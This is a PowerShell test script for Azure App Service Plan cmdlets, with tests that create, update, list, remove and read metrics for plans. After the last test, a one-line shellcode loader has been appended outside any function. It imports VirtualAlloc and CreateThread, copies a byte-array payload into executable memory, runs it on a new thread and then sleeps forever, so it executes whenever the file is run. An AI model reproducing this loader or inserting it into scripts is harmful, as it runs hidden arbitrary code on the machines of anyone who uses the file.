














function Test-CreateNewAppServicePlan
{
	
	$rgname = Get-ResourceGroupName
	$whpName = Get-WebHostPlanName
	$location = Get-Location
	$capacity = 2
	$skuName = "S2"

	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location

		
		$createResult = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier "Standard" -WorkerSize Medium -NumberOfWorkers $capacity
		
		
		Assert-AreEqual $whpName $createResult.Name
		Assert-AreEqual "Standard" $createResult.Sku.Tier
		Assert-AreEqual $skuName $createResult.Sku.Name
		Assert-AreEqual $capacity $createResult.Sku.Capacity

		

		$getResult = Get-AzureRmAppServicePlan -ResourceGroupName $rgname -Name $whpName
		Assert-AreEqual $whpName $getResult.Name
		Assert-AreEqual "Standard" $getResult.Sku.Tier
		Assert-AreEqual $skuName $getResult.Sku.Name
		Assert-AreEqual $capacity $getResult.Sku.Capacity
	}
	finally
	{
		
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-SetAppServicePlan
{
	
	$rgname = Get-ResourceGroupName
	$whpName = Get-WebHostPlanName
	$location = Get-Location
	$tier = "Shared"
	$skuName ="D1"
	$capacity = 0
	$perSiteScaling = $false;

	$newTier ="Standard"
	$newSkuName = "S2"
	$newWorkerSize = "Medium"
	$newCapacity = 2
	$newPerSiteScaling = $true;


	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location
		
		$actual = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier -PerSiteScaling $perSiteScaling
		$result = Get-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $whpName
		
		Assert-AreEqual $whpName $result.Name
		Assert-AreEqual $capacity $result.Sku.Capacity
		Assert-AreEqual $tier $result.Sku.Tier
		Assert-AreEqual $skuName $result.Sku.Name
		Assert-AreEqual $perSiteScaling $result.PerSiteScaling

		
		$newresult = Set-AzureRmAppServicePlan  -ResourceGroupName $rgname -Name  $whpName -Tier $newTier -NumberofWorkers $newCapacity -WorkerSize $newWorkerSize -PerSiteScaling $newPerSiteScaling

		
		Assert-AreEqual $whpName $newresult.Name
		Assert-AreEqual $newCapacity $newresult.Sku.Capacity
		Assert-AreEqual $newTier $newresult.Sku.Tier
		Assert-AreEqual $newSkuName $newresult.Sku.Name
		Assert-AreEqual $newPerSiteScaling $newresult.PerSiteScaling

		
		$newresult.Sku.Capacity = $capacity
		$newresult.Sku.Tier = $tier
		$newresult.Sku.Name = $skuName
		$newresult.PerSiteScaling = $perSiteScaling

		$newresult | Set-AzureRmAppServicePlan

		
		$newresult = Get-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $whpName

		
		Assert-AreEqual $whpName $newresult.Name
		Assert-AreEqual $capacity $newresult.Sku.Capacity
		Assert-AreEqual $tier $newresult.Sku.Tier
		Assert-AreEqual $skuName $newresult.Sku.Name
		Assert-AreEqual $perSiteScaling $newresult.PerSiteScaling

	}
	finally
	{
		
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-GetAppServicePlan
{
	
	$rgname = Get-ResourceGroupName
	
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	$location1 = Get-Location
	$serverFarmName1 = Get-WebHostPlanName
	$tier1 = "Shared"
	$skuName1 ="D1"
	$capacity1 = 0

	$location2 = Get-SecondaryLocation
	$serverFarmName2 = Get-WebHostPlanName
	$tier2 ="Standard"
	$skuName2 = "S2"
	$workerSize2 = "Medium"
	$capacity2 = 2
	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location1
		$serverFarm1 = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $serverFarmName1 -Location  $location1 -Tier $tier1
		
		
		Assert-AreEqual $serverFarmName1 $serverFarm1.Name
		Assert-AreEqual $capacity1 $serverFarm1.Sku.Capacity
		Assert-AreEqual $tier1 $serverFarm1.Sku.Tier
		Assert-AreEqual $skuName1 $serverFarm1.Sku.Name
		
		
		$serverFarm1 = Get-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $serverFarmName1 

		
		Assert-AreEqual $serverFarmName1 $serverFarm1.Name
		Assert-AreEqual $capacity1 $serverFarm1.Sku.Capacity
		Assert-AreEqual $tier1 $serverFarm1.Sku.Tier
		Assert-AreEqual $skuName1 $serverFarm1.Sku.Name

		
		$serverFarm2 = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $serverFarmName2 -Location  $location2 -Tier $tier2 -WorkerSize $workerSize2 -NumberofWorkers $capacity2
		
		
		Assert-AreEqual $serverFarmName2 $serverFarm2.Name
		Assert-AreEqual $capacity2 $serverFarm2.Sku.Capacity
		Assert-AreEqual $tier2 $serverFarm2.Sku.Tier
		Assert-AreEqual $skuName2 $serverFarm2.Sku.Name
		
		
		$result = Get-AzureRmAppServicePlan -Name $serverFarmName1

		
		Assert-AreEqual 1 $result.Count
		$serverFarm1 = $result[0]
		Assert-AreEqual $serverFarmName1 $serverFarm1.Name
		Assert-AreEqual $capacity1 $serverFarm1.Sku.Capacity
		Assert-AreEqual $tier1 $serverFarm1.Sku.Tier
		Assert-AreEqual $skuName1 $serverFarm1.Sku.Name

		
		$result = Get-AzureRmAppServicePlan

		
		Assert-True { $result.Count -ge 2 }

		
		$result = Get-AzureRmAppServicePlan -Location $location1 | Select -expand Name 
		
		
		Assert-True { $result -contains $serverFarmName1 }
		Assert-False { $result -contains $serverFarmName2 }

		
		$result = Get-AzureRmAppServicePlan -ResourceGroupName $rgname | Select -expand Name
		
		
		Assert-AreEqual 2 $result.Count
		Assert-True { $result -contains $serverFarmName1 }
		Assert-True { $result -contains $serverFarmName2 }

	}
	finally
	{
		
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $serverFarmName1 -Force
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $serverFarmName2 -Force
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-RemoveAppServicePlan
{
	
	$rgname = Get-ResourceGroupName
	$serverFarmName = Get-WebHostPlanName
	$location = Get-Location
	$capacity = 0
	$skuName = "D1"
	$tier = "Shared"

	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location

		$serverFarm = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $serverFarmName -Location  $location -Tier $tier
		
		
		Assert-AreEqual $serverFarmName $serverFarm.Name
		Assert-AreEqual $tier $serverFarm.Sku.Tier
		Assert-AreEqual $skuName $serverFarm.Sku.Name
		Assert-AreEqual $capacity $serverFarm.Sku.Capacity

		
		$serverFarm | Remove-AzureRmAppServicePlan -Force
		
		$result = Get-AzureRmAppServicePlan -ResourceGroupName $rgname

		Assert-AreEqual 0 $result.Count 
	}
	finally
	{
		
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-GetAppServicePlanMetrics
{
	
	$rgname = Get-ResourceGroupName
	$location = Get-Location
	$appServicePlanName = Get-WebHostPlanName
	$tier = "Standard"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $appServicePlanName -Location  $location -Tier $tier
		
		$endTime = Get-Date
		$startTime = $endTime.AddHours(-3)

		$metricnames = @('CPU', 'Requests')

		
		$metrics = Get-AzureRmAppServicePlanMetrics -ResourceGroupName $rgname -Name $appServicePlanName -Metrics $metricnames -StartTime $startTime -EndTime $endTime -Granularity PT1M

		$actualMetricNames = $metrics | Select -Expand Name | Select -Expand Value 

		foreach ($i in $metricsnames)
		{
			Assert-True { $actualMetricsNames -contains $i}
		}

		
		$metrics = $serverFarm | Get-AzureRmAppServicePlanMetrics -Metrics $metricnames -StartTime $startTime -EndTime $endTime -Granularity PT1M

		$actualMetricNames = $metrics | Select -Expand Name | Select -Expand Value 

		foreach ($i in $metricsnames)
		{
			Assert-True { $actualMetricsNames -contains $i}
		}
	}
	finally
	{
		
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $appServicePlanName -Force
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-CreateNewAppServicePlanInAse
{
	
	$rgname = Get-ResourceGroupName
	$whpName = Get-WebHostPlanName
	$location = "West US"
	$capacity = 1
	$skuName = "S2"
	$aseName = "asedemo"
	$aseResourceGroupName = "appdemorg"

	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location

		
		$createResult = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier "Standard" -WorkerSize Medium -NumberOfWorkers $capacity -AseName $aseName -AseResourceGroupName $aseResourceGroupName
		
		
		Assert-AreEqual $whpName $createResult.Name
		Assert-AreEqual "Standard" $createResult.Sku.Tier
		Assert-AreEqual $skuName $createResult.Sku.Name
		Assert-AreEqual $capacity $createResult.Sku.Capacity

		

		$getResult = Get-AzureRmAppServicePlan -ResourceGroupName $rgname -Name $whpName
		Assert-AreEqual $whpName $getResult.Name
		Assert-AreEqual "Standard" $getResult.Sku.Tier
		Assert-AreEqual $skuName $getResult.Sku.Name
		Assert-AreEqual $capacity $getResult.Sku.Capacity
	}
	finally
	{
		
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x02,0x53,0x4b,0x2d,0xdb,0xc7,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x57,0x83,0xc6,0x04,0x31,0x56,0x11,0x03,0x56,0x11,0xe2,0xf7,0xaf,0xa3,0xaf,0xf7,0x4f,0x34,0xd0,0x7e,0xaa,0x05,0xd0,0xe4,0xbe,0x36,0xe0,0x6f,0x92,0xba,0x8b,0x3d,0x07,0x48,0xf9,0xe9,0x28,0xf9,0xb4,0xcf,0x07,0xfa,0xe5,0x33,0x09,0x78,0xf4,0x67,0xe9,0x41,0x37,0x7a,0xe8,0x86,0x2a,0x76,0xb8,0x5f,0x20,0x24,0x2d,0xeb,0x7c,0xf4,0xc6,0xa7,0x91,0x7c,0x3a,0x7f,0x93,0xad,0xed,0x0b,0xca,0x6d,0x0f,0xdf,0x66,0x24,0x17,0x3c,0x42,0xff,0xac,0xf6,0x38,0xfe,0x64,0xc7,0xc1,0xac,0x48,0xe7,0x33,0xad,0x8d,0xc0,0xab,0xd8,0xe7,0x32,0x51,0xda,0x33,0x48,0x8d,0x6f,0xa0,0xea,0x46,0xd7,0x0c,0x0a,0x8a,0x81,0xc7,0x00,0x67,0xc6,0x80,0x04,0x76,0x0b,0xbb,0x31,0xf3,0xaa,0x6c,0xb0,0x47,0x88,0xa8,0x98,0x1c,0xb1,0xe9,0x44,0xf2,0xce,0xea,0x26,0xab,0x6a,0x60,0xca,0xb8,0x07,0x2b,0x83,0x50,0x72,0xa0,0x53,0xc5,0x0b,0x21,0x3a,0x7c,0xa7,0xd9,0x8e,0x09,0x61,0x1d,0xf0,0x23,0x5c,0xfa,0x5d,0x9f,0xcd,0xaf,0x32,0x77,0xcb,0x19,0xcc,0x20,0xd4,0x73,0x7d,0x7c,0x40,0x7f,0xd1,0xd1,0xfc,0xc4,0xd4,0xd5,0xfc,0xd2,0x5b,0xd5,0xfc,0x22,0x4b,0xa2,0xaf,0x12,0xa7,0x7b,0x4f,0x03,0xaf,0x2c,0xc6,0x3c,0xe9,0x2c,0x0d,0xcb,0x30,0x81,0xc5,0xcc,0x8e,0xc6,0x91,0x9e,0xbd,0x55,0xce,0x73,0x14,0x32,0x1b,0x26,0xb6,0xf9,0x24,0x1c,0x50,0x97,0xd0,0xc0,0x35,0xe8,0xd7,0xfe,0xc5,0x61,0xf7,0x95,0xc1,0x21,0x9d,0x76,0x9c,0xa9,0x14,0xcf,0xbe,0xac,0x29,0x1a,0xed,0xe3,0x86,0xf6,0x44,0x6c,0x05,0xff,0x70,0x17,0xaa,0x2a,0x05,0x27,0x21,0xdf,0x49,0xdd,0x10,0xb7,0xa5,0xa8,0x00,0x1e,0xb9,0x06,0x2e,0xdf,0x2d,0xa9,0xbe,0xdf,0xad,0xc1,0xbe,0xdf,0xed,0x11,0xed,0xb7,0xb5,0xb5,0x42,0xad,0xb9,0x63,0xf7,0x7e,0x15,0x05,0x10,0xd7,0xf1,0x15,0xfe,0xd8,0x01,0x45,0xa8,0xb0,0x13,0xff,0xdd,0xa3,0xeb,0x2a,0x58,0xe3,0x60,0x18,0xe9,0xe3,0x89,0x61,0x68,0x2b,0xfc,0x80,0x2a,0x6f,0xa0,0xa2,0xbf,0x90,0xa0,0xcc,0x0e,0x56,0x6d,0x1d,0x41,0x9e,0xa9,0x4f,0x90,0xee,0xf1,0xa1,0xe0,0x3e,0x34,0xbe;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

